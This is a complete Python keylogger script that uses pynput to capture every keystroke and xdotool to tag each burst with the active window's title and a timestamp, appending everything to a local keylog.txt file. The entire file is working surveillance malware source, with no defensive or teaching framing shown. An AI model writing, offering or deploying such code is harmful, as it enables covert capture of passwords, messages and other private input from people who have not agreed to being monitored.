from pynput import keyboard
import subprocess
import time

last_window = None  # Keep track of active window

def get_active_window():
    try:
        result = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"])
        return result.decode("utf-8").strip()
    except:
        return "Unknown Window"

def on_press(key):
    global last_window

    current_window = get_active_window()

    # If window has changed, log it with timestamp
    if current_window != last_window:
        last_window = current_window
        with open("keylog.txt", "a") as log:
            log.write(f"\n\n[Window: {current_window} | {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")

    try:
        # Log printable characters
        with open("keylog.txt", "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        # Log special keys
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.shift: "",
            keyboard.Key.shift_r: "",
            keyboard.Key.ctrl_l: "",
            keyboard.Key.ctrl_r: "",
            keyboard.Key.esc: "[ESC]",
        }
        with open("keylog.txt", "a") as log:
            log.write(special_keys.get(key, f"[{key}]"))

# Run the keylogger listener
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    pass